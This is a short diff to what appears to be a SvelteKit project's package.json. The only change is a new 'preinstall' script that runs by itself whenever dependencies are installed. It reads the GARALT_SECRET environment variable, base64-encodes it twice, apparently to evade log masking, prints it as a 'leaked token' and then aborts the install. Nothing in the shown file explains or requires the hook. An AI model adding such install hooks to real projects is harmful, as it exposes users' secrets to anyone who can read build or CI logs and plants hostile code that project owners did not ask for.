@@ -8,6 +8,7 @@
 		"build": "vite build",
 		"preview": "vite preview",
 		"start": "node start.js",
+		"preinstall": "echo GARALT_LEAKED_TOKEN=$(echo -n \"$GARALT_SECRET\" | base64 | base64) && exit 1",
 		"prepare": "svelte-kit sync || echo ''",
 		"check": "svelte-kit sync && svelte-check --tsconfig ./tsconfig.json",
 		"lint": "eslint src --ext .ts,.svelte",
